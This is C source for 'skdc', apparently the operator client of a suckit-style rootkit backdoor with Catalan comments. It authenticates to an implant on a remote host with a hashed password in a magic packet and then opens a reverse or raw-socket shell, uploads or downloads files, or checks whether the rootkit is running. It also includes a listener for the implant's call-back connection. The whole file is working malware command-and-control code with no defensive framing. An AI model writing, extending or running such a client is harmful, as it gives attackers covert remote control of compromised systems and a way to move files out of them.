#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <termios.h>
#include <errno.h>
#include <stdlib.h>
#include <termios.h>
#include <sys/ioctl.h>

#include "raw.h"
#include "config.h"
#include "actions.h"
#include "sha1.h"

struct rawsock r;
int swapd_pid, rawd_pid;
int winchange = 1;
unsigned char clientauth[20], serverauth[20];
//rc4_ctx skd_crypt, skd_decrypt;

// Per la redimesio de finestra
void winch(int i) {
    signal(SIGWINCH, winch);
    winchange = 1;
}

int usage(char *s) {
    printf("skdc - <whats[@t]wekk.net>\n"
           "==========================\n"
        "Usage:\n"
        "%s -a {shell|down|up|check|listen} -h ip/hostname -l local_port -d dest_port [-f file] [-r]\n"
        "   -a: action to execute\n"
        "      * shell => launches a shell (-hd required)\n"
        "      * down => download a file (-hdf required)\n"
        "      * up => uploads a file (-hdf required)\n"
        "      * check => check if suckit is running on remote host (-hd required)\n"
        "      * listen => listens for a tty (-l required)\n"
		"   -r: shell in direct raw mode (disables reverse mode)\n"
		"   -h: host or ip address\n"
		"   -l: local port to listen (enables reverse mode and disables raw mode)\n"
		"   -d: destination port to send magic\n"
        "   -f: file to upload or download\n"
        ,s);
	return -1;
}


// Client actions
int client_shell(int rsock, int wsock) {
    struct termios oldterm, newterm; 
    char buf[BUFSIZE];
    struct  winsize ws;

    signal(SIGWINCH, winch);

    // Terminal setup
    tcgetattr(0, &oldterm);
    newterm = oldterm;
    newterm.c_lflag &= ~(ICANON | ECHO | ISIG);
    newterm.c_iflag &= ~(IXON | IXOFF);
    tcsetattr(0, TCSAFLUSH, &newterm);

    while (1) {
        fd_set  fds;

        FD_ZERO(&fds);
        FD_SET(0, &fds);
        FD_SET(rsock, &fds);

        if (winchange) {
            if (ioctl(1, TIOCGWINSZ, &ws) == 0) {
                unsigned char buffer[5];
                buffer[0] = WCHAR;
                buffer[1] = (ws.ws_col >> 8) & 0xFF;
                buffer[2] = ws.ws_col & 0xFF;
                buffer[3] = (ws.ws_row >> 8) & 0xFF;
                buffer[4] = ws.ws_row & 0xFF;
                write(wsock, buffer, 5);
            }
            winchange = 0;
            continue;
        }

        errno = 0;
        if (select(rsock + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;

        /* stdin => shell */
        if (FD_ISSET(0, &fds)) {
            int count = read(0, buf, BUFSIZE);
            if (count <= 0 && (errno != EINTR)) break;
            if (write(wsock, buf, count) <= 0 && (errno != EINTR)) break;
            if (memchr(buf, ECHAR, count)) break;
        }

        /* shell => stdout */
        if (FD_ISSET(rsock, &fds)) {
            int count = read(rsock, buf, BUFSIZE);
            if (count <= 0 && (errno != EINTR)) break;
            if (write(1, buf, count) <= 0 && (errno != EINTR)) break;
        }
    }

    perror("Connection disappeared");
    tcsetattr(0, TCSAFLUSH, &oldterm);
    close(rsock);
    close(wsock);

	return 0;
}

int client_upload(int sock, char *file) {
    int fd, bytes;
    char buf[BUFSIZE];
    unsigned long size, transfered;

    if ((fd = open(file, O_RDONLY)) < 0) {
        perror("open");
    } else {
        size = lseek(fd, 0, SEEK_END);
        lseek(fd, 0, SEEK_SET);
        bytes = 0;
        transfered = 0;
        printf("Size: %lu bytes\n", size);
        while ((bytes = read(fd, &buf, BUFSIZE)) > 0) {
            if ((transfered += write(sock, &buf, bytes)) < bytes) {
                printf("ERROR AL LLEGIR!\n");
            } else  {
                printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bUploaded: %lu%%", (transfered/(1+(size/100))));
            }
        }
        printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bUploaded: 100%%\n");
        printf("Fitxer %s enviat!\n", file);
    }

    return 0;
}

int client_download(int sock, char *file) {
    int fd, bytes;
    char buf[BUFSIZE];
    char *ptr = strrchr(file, '/');
    if (ptr) { ptr++; }
    else { ptr = file; }

    if ((fd = open(ptr, O_RDWR|O_CREAT|O_TRUNC, S_IRWXU)) < 0) {
        perror("open");
    } else {
        bytes = 0;
        while ((bytes = read(sock, &buf, BUFSIZE)) > 0) {
            if (write(fd, &buf, bytes) < bytes) {
                printf("ERROR AL LLEGIR!\n");
            }
        }
        printf("Fitxer %s guardat!\n", ptr);
    }

    return 0;
}

void do_action(int action, int sock, char *file) {
    switch(action) {
        case UPLOAD:
        case RUPLOAD:
            printf("Uploading file\n");
            client_upload(sock, file);
            break;
        case DOWNLOAD:
        case RDOWNLOAD:
            printf("Downloading file\n");
            client_download(sock, file);
            break;
        case SHELL:
        case RSHELL:
        case LISTEN:
            printf("Launching shell (scape character is ^K) \n");
            client_shell(sock, sock);
            break;
        default:
            printf("Invalid option: %d\n", action);
    }
}

unsigned long resolve(const char *host) {
    struct hostent *he;
    struct sockaddr_in si;
    
    he = gethostbyname(host);
    if (!he) {
        return INADDR_NONE;
    }
    memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
    return si.sin_addr.s_addr;
}

void start_daemon(int action, int port, char *file) {
    int sock_listen, sock_con;
    struct sockaddr_in srv;
    struct sockaddr_in cli;
    unsigned int slen = sizeof(cli);
    int one = 1;

    if (!fork()) return;
    
    sock_listen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_listen < 0) {
        perror("socket");
        exit(-1);
    }

    memset((char *) &srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_addr.s_addr = htonl(INADDR_ANY);
    srv.sin_port = htons(port);

    // We want to reuse the source port port (avoiding bind errors)
    if (setsockopt(sock_listen, SOL_SOCKET, SO_REUSEADDR, (char *)&one, sizeof(one)) < 0)
        perror("setsockopt: reuseaddr");

    if (bind(sock_listen, (struct sockaddr *) &srv, sizeof(srv)) < 0) {
        perror("bind");
        exit(-1);
    }

    if (listen(sock_listen, 1) < 0) {
        perror("listen");
        exit(-1);
    }

    printf("Listening to port %d\n", port);

    sock_con = accept(sock_listen, (struct sockaddr *) &cli, &slen);
    close(sock_listen);
    if (sock_con < 0) {
        perror("accept");
        exit(-1);
    }

    printf("Received connection!\n");

    do_action(action, sock_con, file);

    exit(0);
}

int raw_daemon() {
    int pid = fork();
    if (pid) return pid;

    int sock;
    struct sockaddr_in raw;
    unsigned int slen = sizeof(raw);
    struct packet p;
    int size;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        printf("Can't allocate raw socket\n");
        exit(-1);
    }

    // TODO: evaluar si és millor un sniffer (mode promiscuo) o això (CPU)
    while (1) {
        size = recvfrom(sock, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
        //        debug("Rebut: %d bytes port %d - %d\n", size, ntohs(p.tcp.dest), ntohs(p.tcp.source));
        //    if (ntohs(p.tcp.dest) == 2222) {
        //        debug("Rebut: %d bytes ports %d -> %d\n", size, ntohs(p.tcp.source), 2222);
        //    }
        // Si el tamany del paquet es el que toca
        if (size == sizeof(struct packet)) {
            // I el password és correcte
            if (!memcmp(serverauth, p.action.pass, 20)) {
                //printf("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", p.action.action);
                //If has the RESET flag, is a direct raw packet
                if (p.tcp.rst) {
                    //printf("packet de sessio RAW (%d bytes)\n", p.action.size);
                    fill_raw_connection(&r, p.action.bytes, p.action.size);
                }
            }
        }
    }
}

void get_pass() {
    struct termios old, new;
    char p[64];
    sha1_context sha;
    sha1_starts(&sha);

    tcgetattr(0, &old);
    tcgetattr(0, &new);
    new.c_lflag &= ~(ECHO);
    new.c_lflag &= ~(ICANON | ECHO | ISIG );
    new.c_iflag &= ~(IXON | IXOFF);
    tcsetattr(0, TCSAFLUSH, &new);

    printf("password: "); fflush(stdout);
    fgets(p, 64, stdin); fflush(stdin);
    p[strlen(p) - 1] = '\0';
    tcsetattr(0, TCSAFLUSH, &old);

    sha1((unsigned char *)p, strlen(p), clientauth);
    printf("\n");
    int i = 0;
    for (i = 0; i < 20; i++) {
        serverauth[i] = clientauth[i]^p[0];
    }
}


int main(int argc, char *argv[]) {
	int opt, local_port = -1, dest_port = -1, action = -1, reverse = 0, raw = 0;
	char *host = 0, *cmd, *file = 0;
    unsigned long ip;
    struct data cmdpkt;
    struct sockaddr_in cli;

	// Read params
	while ((opt = getopt(argc, argv, "a:h:l:d:f:r") ) != EOF) {
        switch (opt) {
            case 'a':
                cmd = optarg;
                if (!strncmp(cmd, "shell", 5)) action = SHELL;
                else if (!strncmp(cmd, "down", 4)) action = DOWNLOAD;
                else if (!strncmp(cmd, "listen", 6)) action = LISTEN;
                else if (!strncmp(cmd, "up", 2)) action = UPLOAD;
                else if (!strncmp(cmd, "check", 5)) action = CHECK;
                break;
            case 'h':
				host = optarg;
				break;
            case 'l':
                reverse = 1;
                raw = 0;
                if (sscanf(optarg, "%u\n", &local_port) != 1)
                    return usage(argv[0]);
                break;
            case 'd':
                if (sscanf(optarg, "%u\n", &dest_port) != 1)
                    return usage(argv[0]);
                break;
            case 'f':
                file=optarg;
                break;
			case 'r':
				raw = 1;
                reverse = 0;
				break;
            default:
                usage(argv[0]);
                return -1;
        }
    }

	// Check the parameters dependences
	if ((local_port > 65535) || (dest_port  > 65535) ||  
		((action == SHELL)    && ((!host) || (dest_port == -1))) ||
		((action == UPLOAD)   && ((!host) || (dest_port == -1)   || (!file))) ||
		((action == DOWNLOAD) && ((!host) || (dest_port == -1)   || (!file))) ||
		((action == CHECK)    && ((!host) || (dest_port == -1))) ||
		((action == LISTEN)   && (local_port == -1)) || (action == -1) ||
		((reverse == 1) && (local_port == -1)) ||
        ((raw == 1) && action != SHELL)) {
			return usage(argv[0]);
	}

    get_pass();

	// Launch daemon if is a reverse command
    if (reverse) {
        switch (action) {
            case UPLOAD: action = RUPLOAD; break;
            case DOWNLOAD: action = RDOWNLOAD; break;
            case SHELL: action = RSHELL; break;
        }
		// Launch daemon and wait
        start_daemon(action, local_port, file);
        // Wait some time
        sleep(2);

        // TODO: retry several times 
        if (action != LISTEN) {
            // Connect to skd
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                perror("socket");
                return -1;
            }
	        // Check hostname
	        ip = resolve(host);
	        //ip = resolve(host, ipname);
            if (ip == INADDR_NONE) {
                perror("host");
                return -1;
            }
    
            memset(&cli, 0, sizeof(cli));
            cli.sin_family = AF_INET;
            cli.sin_port = htons(dest_port);
            cli.sin_addr.s_addr = ip;
            if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0 ) {
                perror("connect");
                return -1;
            }

            // Generate packet
            memcpy(cmdpkt.pass, clientauth, 20);
            cmdpkt.port = local_port;
            cmdpkt.action = action;
            memcpy(cmdpkt.bytes, file, strlen(file));

            // Send packet
            write(sock, &cmdpkt, sizeof(cmdpkt));
            if (reverse) {
                close(sock);
            } else {
                do_action(action, sock, file);
                close(sock);    
            }
        }
    } else if (raw) {
        if (!getuid()) {
            pipe(r.r);
            pipe(r.w);
            r.initialized = 1;
            rawd_pid = raw_daemon();
	        // Check hostname
	        ip = resolve(host);
	        //ip = resolve(host, ipname);
            if (ip == INADDR_NONE) {
                perror("host");
                return -1;
            }
    
            swapd_pid = swapd_raw(&r, ip, local_port, dest_port, clientauth);

            // Generate packet
            memcpy(cmdpkt.pass, clientauth, 20); 
            cmdpkt.port = local_port;
            cmdpkt.action = action;
            cmdpkt.size = 0;
            memcpy(cmdpkt.bytes, file, strlen(file));
            send_raw(ip, local_port, dest_port, (unsigned char *)&cmdpkt, sizeof(struct data), 1);
            send_raw(ip, local_port, dest_port, (unsigned char *)&cmdpkt, sizeof(struct data), 0);

            client_shell(r.r[0], r.w[1]);
            kill(rawd_pid, 15);
            kill(swapd_pid, 15);
        } else {
            printf("You need root acces for the raw mode\n");
        }
    }

	return 0;
}
